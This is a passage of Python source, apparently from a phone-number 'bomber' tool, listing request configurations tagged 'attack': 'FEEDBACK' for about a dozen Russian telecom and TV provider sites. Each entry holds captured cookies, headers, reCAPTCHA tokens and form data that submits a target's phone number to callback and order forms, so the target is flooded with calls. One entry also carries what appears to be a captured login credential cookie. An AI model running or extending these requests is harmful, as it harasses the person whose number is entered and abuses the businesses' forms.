            'cookies': {'PHPSESSID': '021cs22ppdqqvrrojmgks3g101', 'tmr_lvid': 'fa683461b56feead2b207ec92f5af950', 'tmr_lvidTS': '1687873757966', '_ym_uid': '1687873759579594019', '_ym_d': '1687873759', '_ym_visorc': 'w', '_fbp': 'fb.1.1687873759023.1567269286', 'cted': 'modId%3Dg3p2i7bj%3Bya_client_id%3D1687873759579594019%3Bfbp%3Dfb.1.1687873759023.1567269286', 'tmr_detect': '1%7C1687873760819', '_ym_isad': '1', '_ct_ids': 'g3p2i7bj%3A47237%3A334210849', '_ct_session_id': '334210849', '_ct_site_id': '47237', 'call_s': '%3C!%3E%7B%22g3p2i7bj%22%3A%5B1687875586%2C334210849%2C%7B%22276833%22%3A%22822866%22%7D%5D%2C%22d%22%3A2%7D%3C!%3E', '_ct': '1800000000220456857', '_ct_client_global_id': 'e0cb1847-76a0-55f8-bebf-f0774db1ddb8'},
            'headers': {'authority': 'k-telecom.org', 'accept': 'application/json, */*;q=0.1', 'accept-language': 'ru,en;q=0.9', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarymBatVXf9q19TddMu', 'origin': 'https://k-telecom.org', 'referer': 'https://k-telecom.org/feedback/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n13579\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.7.5.1\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nru_RU\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f13579-o1\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n0\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="_wpcf7_recaptcha_response"\r\n\r\n03AL8dmw_-7OJ8QC8T5t3Fcx2ils_YwMxsjISzQFaBOeSfSUSaO8dtXN-kI52cFXc0ZsnBeEBwQAUaVoZxnVHAmayYJ-TKTHRKeXILKaf6hgSHDVxIVkWQdTMHe0u7pAupEnCqMOAilao6yx_OF8SF27LcP25qmfMM8mhPNT-7enk1ZUZoAvVAvPj7QmgPrAYTyt6AZtM4_hLbBqTvKTNK0RZ92m0y2opbtxDi8a_sl6QiGHpLmJaLiIBE6sdB5w5c5IA5fLwceXEbbGJg6DjOxkledQ8Z2jDQclUkRh8waGuovalUnqIz7SBYbhz3lK1XFKuipDliim07FIgPED_6Kcv-aFELilFbbGy-szTP1v2QrDF_1Ajq3XcI1fEHmlHV0kMtEfKcwhBMBl8Ni1yGWAw1b9Rr1xnmT7TZPgANdYE63zA5TMqconSnhpTZZwonI826ekIpScj5W4jpODkdT_g7vubPMPAUuFuI5g3MI6lb50qtAxOTjnEyrKpMg0YecX3raf8-d8fI1yfnL14IVCAX8CZ8-2inBhRAW2WBHfITXBxClzMTKfA\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="post-url"\r\n\r\nhttps://k-telecom.org/feedback/\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="goal"\r\n\r\nFEEDBACK_FORM_SEND\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="main_form"\r\n\r\n1\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="to_arm"\r\n\r\n1\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="to_bargains"\r\n\r\n1\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="packet-tv-name"\r\n\r\n\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="tariffNameHidden"\r\n\r\nНе выбран\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="your-name"\r\n\r\nINSIDE\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="your-tel"\r\n\r\n+7({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:]}\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="your-city"\r\n\r\nРевда\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="check-agree"\r\n\r\n1\r\n------WebKitFormBoundarymBatVXf9q19TddMu\r\nContent-Disposition: form-data; name="city"\r\n\r\n\r\n------WebKitFormBoundarymBatVXf9q19TddMu--\r\n'.encode(),
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Vsevnet.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://vsevnet.ru/json/contact-form-7/v1/contact-forms/5264/feedback',
            'cookies': {'_ym_uid': '1687874152489053112', '_ym_d': '1687874152', '_ga': 'GA1.1.546480914.1687874152', '_ym_isad': '1', '_ym_visorc': 'w', '_ga_LVWK7T8933': 'GS1.1.1687874152.1.0.1687874162.0.0.0',},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryvAHRtz3067dhnRTV', 'Origin': 'https://vsevnet.ru', 'Referer': 'https://vsevnet.ru/smotreshka_leto_2023/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n5264\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.1.6\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nru_RU\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f5264-p13411-o1\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n13411\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\n03AL8dmw-DfHuecXkOUnGkSmGwFY2GQRZfdXZIUyrCfjQvS4y3dkXbjVfKjsAgz7ZTRpbkr0uALVYjLa_yE__aJndmm2w80UbepJ0uYsNUIppIBjN3Ehy-ZUrjlVg0Lgh_RvfEvGbAoMBL1jBTYouKuWmP0DEOgq2RL7lKggzsz_hawJcLX1ys-GVdigNA2KWGGqOIyRrYHG-LLgj33bnvmATTSs0nZnGBL6UUtZLlqjngVeY5Qu9UWRwaKLDC7uDBqLUA0zljjjMMqxXNbEX2TXXwC_spRhGuhnvc_rE5paXDaCli-4-fkotQLGpoCdHW6qpohItpHIiQNqdXQTWULngMyXy7mDn70D1o3ekjSkgnPgNOB_TlobKjIZblpb4EpnAZLcIdxmaixtnDZRX-UU25DwD0wz86X_FL_yk-88ixN-TbhYs9tdwoNmSHsQ3V3w9_KCZvSItFqjwUn9CrR32boG0ptBuMoVwWmAQceJY_aVirTlfny1r6XB0mUOdfKt9T_Ra2zStCWsfLNATnz4m8vP3wNj8UqjdP9Mu4bw_7n_X5O96IuO0\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="your-name"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="your-email"\r\n\r\n{email()}\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="your-tel"\r\n\r\n{number}\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="time-to-call"\r\n\r\nСейчас\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="your-subject"\r\n\r\nСмотрешка акция лето 2023\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="your-message"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV\r\nContent-Disposition: form-data; name="accept-this-1"\r\n\r\n1\r\n------WebKitFormBoundaryvAHRtz3067dhnRTV--\r\n'.encode(),
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Megapolis-Telecom38.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.megapolis-telecom38.ru/api/v1/customer/orders',
            'cookies': {'TCPCS': '60c3b419eb4f0aa53a5e10c91868fb58', 'first_visit_url': 'www.megapolis-telecom38.ru%2F', 'traffic_source': 'direct', 'user_uuid': '9141e590-1fc2-405c-ac26-bb2e5380d05c', 'first_visit_url_long_term': 'www.megapolis-telecom38.ru%2F', 'first_visit_timestamp': '1687875327', 'first_visit_referer': '', 'first_visit_is_paid': 'false', 'RBPCS': 'd73cfcf0545356372aa491db0f64e5c0', 'tmr_lvid': '9d73d47da66dce8b317ae1bc0d89c9ac', 'tmr_lvidTS': '1687875304687', 'ab_test_group': '2d', '_ym_uid': '1687875305986805201', '_ym_d': '1687875305', '_ym_isad': '1', '_ym_visorc': 'w', '_ga': 'GA1.2.426876189.1687875306', '_gid': 'GA1.2.299279203.1687875306', 'tmr_detect': '0%7C1687875306999', '_ga_MCCZD56HPZ': 'GS1.1.1687875305.1.1.1687876454.51.0.0', 'user_credentials': '97de0f9788847d5e39f8490e433057b315e0804294ded5a86b1cfc00aef607e80b010d7a13407e2845fb30234345321e167cfc846b6fa485678911c0c418cedf%3A%3A63271274%3A%3A2024-06-27T17%3A34%3A45%2B03%3A00', 'user_analytics': '%7B%22id%22%3A63271274%2C%22packet%22%3A%22buyer%22%2C%22roles%22%3A%22user%22%7D', '_pulscen_session': 'BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTYzZjAzODk3MzM1NTcwZWFiOWI3ZmRmZGQ0YjQ3YjE4BjsAVEkiFXVzZXJfY3JlZGVudGlhbHMGOwBUSSIBgDk3ZGUwZjk3ODg4NDdkNWUzOWY4NDkwZTQzMzA1N2IzMTVlMDgwNDI5NGRlZDVhODZiMWNmYzAwYWVmNjA3ZTgwYjAxMGQ3YTEzNDA3ZTI4NDVmYjMwMjM0MzQ1MzIxZTE2N2NmYzg0NmI2ZmE0ODU2Nzg5MTFjMGM0MThjZWRmBjsARkkiGHVzZXJfY3JlZGVudGlhbHNfaWQGOwBUaQRqccUD--ce8ad9ce05debd8ccb368d31a2ca32c5617b28fb'},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://www.megapolis-telecom38.ru', 'Referer': 'https://www.megapolis-telecom38.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
            'data': {'order[order_type]': 'callback', 'order[company_id]': '99724548', 'order[customer_phone]': number, 'order[first_visit_url]': 'www.megapolis-telecom38.ru/',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'SoftVideo.ru', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://softvideo.ru/index.php?option=com_softvideo&jform%5Bname%5D=INSIDE&jform%5Bphone%5D=8({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&task=form.process&layout=porder',
            'cookies': {'9de1ee704e06694865a164249f8f6a01': 'p38i0bii5s3a9k2c7liro5acic', '_ym_uid': '1687978257365255072', '_ym_d': '1687978257', '_ym_isad': '1', '_ym_visorc': 'w',},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Referer': 'https://softvideo.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-CSRF-Token': 'b6c4c40eb9b5477af08aa2fe0b0d94bf', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Wifire-com.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.wifire-com.ru/wp-json/contact-form-7/v1/contact-forms/9035/feedback',
            'cookies': {'PHPSESSID': 'lkn366miit5kqmbqhdvi6a8v0b', 'wt_geo_data': '%7B%22administrative_district%22%3Anull%2C%22country%22%3Anull%2C%22district%22%3Anull%2C%22region%22%3Anull%2C%22city%22%3A%22%5Cu0421%5Cu0430%5Cu043d%5Cu043a%5Cu0442-%5Cu041f%5Cu0435%5Cu0442%5Cu0435%5Cu0440%5Cu0431%5Cu0443%5Cu0440%5Cu0433%22%7D', '_ym_uid': '1687978639952781194', '_ym_d': '1687978639', '_ym_visorc': 'w', '_ym_isad': '1', '_ga_KD1ZYR499X': 'GS1.1.1687978639.1.0.1687978639.0.0.0', '_ga': 'GA1.1.490970240.1687978640',},
            'headers': {'Accept': 'application/json, */*;q=0.1', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryvr4UvQ1Zh15eevoc', 'Origin': 'https://www.wifire-com.ru', 'Referer': 'https://www.wifire-com.ru/connect/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n9035\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.5.4\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nru_RU\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f9035-p2345-o1\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n2345\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="main-contact-form-adress-city"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="main-contact-form-adress-street"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="main-contact-form-adress-dom"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="main-contact-form-adress-kv"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="main-contact-form-fio"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="main-contact-form-name"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="main-contact-form-otchestvo"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc\r\nContent-Disposition: form-data; name="main-contact-form-tel"\r\n\r\n+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}\r\n------WebKitFormBoundaryvr4UvQ1Zh15eevoc--\r\n',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Sibset.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://nsk.sibset.ru/ajax/request-callback/',
            'cookies': {'PHPSESSID': '126llke2p8nn62fvl6ejkdpf89', '_csrf': 'As54qSaEuhjwsb_NjH-pJTFkqIhlxLM4', '_ym_uid': '1687978913323047835', '_ym_d': '1687978913', '_ym_isad': '1', 'tmr_lvid': '483a73aa0606bc3463f2af3fe03869cf', 'tmr_lvidTS': '1687978912592', '_ga': 'GA1.2.333828952.1687978913', '_gid': 'GA1.2.592111985.1687978913', '_gat_gtag_UA_89279618_2': '1', '_gat_UA-89279618-3': '1', '_gat': '1', '_ym_visorc': 'w', 'tmr_detect': '1%7C1687978937546'},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://nsk.sibset.ru', 'Referer': 'https://nsk.sibset.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-CSRF-Token': 'm0DXSKnjxTYCoYTXScm5h_VTzryjRw72kjPWG2ABPx3aM-J82LCkc3fJ7qA6q-bJnxvjzOkTSJ3jer53GE1yKQ==', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'promo=&phone+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&city=nsk&type=header&is_connected=1&isBecomeAbonent=true',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'MirBeeline.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://mirbeeline.ru/tv/tve',
            'cookies': {'__ddg1_': 'zRUWan5DTGK79zV8RBDd', 'PHPSESSID': '40e01eada4ce222b0cd83a21e5ff4a5a', '_gid': 'GA1.2.374168346.1687979180', '_ym_uid': '1687979181618978581', '_ym_d': '1687979181', '_ym_isad': '1', '_ym_visorc': 'w', '_gat_gtag_UA_53266665_2': '1', '_ga_TGHF7703XM': 'GS1.1.1687979179.1.1.1687979254.52.0.0', '_ga': 'GA1.1.902188382.1687979180',},
            'headers': {'authority': 'mirbeeline.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOlIptY6gOBYVmIcv', 'origin': 'https://mirbeeline.ru', 'referer': 'https://mirbeeline.ru/tv/tve', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundaryOlIptY6gOBYVmIcv\r\nContent-Disposition: form-data; name="submitted"\r\n\r\n102481\r\n------WebKitFormBoundaryOlIptY6gOBYVmIcv\r\nContent-Disposition: form-data; name="isPopup102481"\r\n\r\n1\r\n------WebKitFormBoundaryOlIptY6gOBYVmIcv\r\nContent-Disposition: form-data; name="fields[102482]"\r\n\r\n\r\n------WebKitFormBoundaryOlIptY6gOBYVmIcv\r\nContent-Disposition: form-data; name="fields[102483]"\r\n\r\nМосква\r\n------WebKitFormBoundaryOlIptY6gOBYVmIcv\r\nContent-Disposition: form-data; name="fields[102484]"\r\n\r\n\r\n------WebKitFormBoundaryOlIptY6gOBYVmIcv\r\nContent-Disposition: form-data; name="fields[102485]"\r\n\r\n\r\n------WebKitFormBoundaryOlIptY6gOBYVmIcv\r\nContent-Disposition: form-data; name="fields[102486]"\r\n\r\n\r\n------WebKitFormBoundaryOlIptY6gOBYVmIcv\r\nContent-Disposition: form-data; name="fields[102487]"\r\n\r\n+7 ({str(number)[1:4]}) {str(number)[4:7]} {str(number)[7:9]}{str(number)[9:]}\r\n------WebKitFormBoundaryOlIptY6gOBYVmIcv\r\nContent-Disposition: form-data; name="fields[102488]"\r\n\r\n1\r\n------WebKitFormBoundaryOlIptY6gOBYVmIcv\r\nContent-Disposition: form-data; name="fields[0]"\r\n\r\n0e8fc3e00e6ddca6f859719e2ddcdc225\r\n------WebKitFormBoundaryOlIptY6gOBYVmIcv\r\nContent-Disposition: form-data; name="fields[1]"\r\n\r\n\r\n------WebKitFormBoundaryOlIptY6gOBYVmIcv--\r\n'.encode(),
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Beellne.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://beellne.ru/tv/tve',
            'cookies': {'__ddg1_': 'YldR7wWTB9OD2nApExOW', 'PHPSESSID': '00c05ea49c6bc9ee07a2c3f23defbc45', '_gid': 'GA1.2.826254581.1687979183', '_ga_E238RTVFXX': 'GS1.1.1687979183.1.0.1687979183.0.0.0', '_ga': 'GA1.1.1314237542.1687979183', '_ym_uid': '1687979245527888149', '_ym_d': '1687979245', '_ym_isad': '1', '_ym_visorc': 'w',},
            'headers': {'authority': 'beellne.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary0KNb3OBE8bxKVKlt', 'origin': 'https://beellne.ru', 'referer': 'https://beellne.ru/tv/tve', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="submitted"\r\n\r\n93091\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="isPopup93091"\r\n\r\n1\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="fields[93092]"\r\n\r\n\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="fields[93093]"\r\n\r\nМосква\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="fields[93094]"\r\n\r\n\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="fields[93095]"\r\n\r\n\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="fields[93096]"\r\n\r\n\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="fields[93097]"\r\n\r\n+7 ({str(number)[1:4]}) {str(number)[4:7]} {str(number)[7:9]}{str(number)[9:]}\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="fields[93099]"\r\n\r\n1\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="fields[93100]"\r\n\r\n\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="fields[0]"\r\n\r\n8872926621ada00ce99fac2d6d8e8e9d5\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt\r\nContent-Disposition: form-data; name="fields[1]"\r\n\r\n\r\n------WebKitFormBoundary0KNb3OBE8bxKVKlt--\r\n'.encode(),
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Fryazino.net', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://fryazino.net/local/ajax/connector.php',
            'cookies': {'PHPSESSID': 'RbAmauIanzviEDfT8zHbIebSX0cifed0', '_ym_uid': '1687979826403219801', '_ym_d': '1687979826', 'BX_USER_ID': '6e1d41fcf0cb3f5c32e9e7ccaefba99f', '_ym_isad': '1', '_ym_visorc': 'w',},
            'headers': {'authority': 'fryazino.net', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://fryazino.net', 'referer': 'https://fryazino.net/services/tv/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': 'data={"tarif":"","type":"","page":"https://fryazino.net/services/tv/#kabelnoe","referal":"","ip":"' + '213.157.6.50' + '","promo_title":"","promo_url":"","name":"INSIDE","phone":"' + f'+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}' + '","comments":"INSIDE","method":"feedback","hash":"#kabelnoe"}',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Kristall-Pervoe.tv', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.kristall-pervoe.tv/podkl.php',
            'cookies': {'_ym_uid': '1687980448183535727', '_ym_d': '1687980448', '_ym_isad': '1', '_ga': 'GA1.2.424827467.1687980448', '_gid': 'GA1.2.1792423659.1687980448', '_gat_gtag_UA_132588326_1': '1', '_ym_visorc': 'w',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://www.kristall-pervoe.tv', 'Referer': 'https://www.kristall-pervoe.tv/tujmazy/home/t/tariff.html', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'tel': number, 'tariff': 'Кабельное ТВ', 'cena': '120',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Dantser.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://dantser.ru/wp-json/contact-form-7/v1/contact-forms/26585/feedback',
            'cookies': {'wt_geo_data': '%7B%22location%22%3Anull%7D', '_ga': 'GA1.2.267635381.1687980650', '_gid': 'GA1.2.278496322.1687980650', '_ym_uid': '1687980651292645613', '_ym_d': '1687980651', 'tmr_lvid': '91d1b44100ca2433232eb59aebdb31db', 'tmr_lvidTS': '1687980651527', '_ym_visorc': 'w', 'cookielawinfo-checkbox-necessary': 'yes', 'cookielawinfo-checkbox-functional': 'no', 'cookielawinfo-checkbox-performance': 'no', 'cookielawinfo-checkbox-analytics': 'no', 'cookielawinfo-checkbox-advertisement': 'no', 'cookielawinfo-checkbox-others': 'no', 'tmr_detect': '1%7C1687980651830', '_ym_isad': '1'},
            'headers': {'Accept': 'application/json, */*;q=0.1', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarykz9rxJvpcBSXycSH', 'Origin': 'https://dantser.ru', 'Referer': 'https://dantser.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
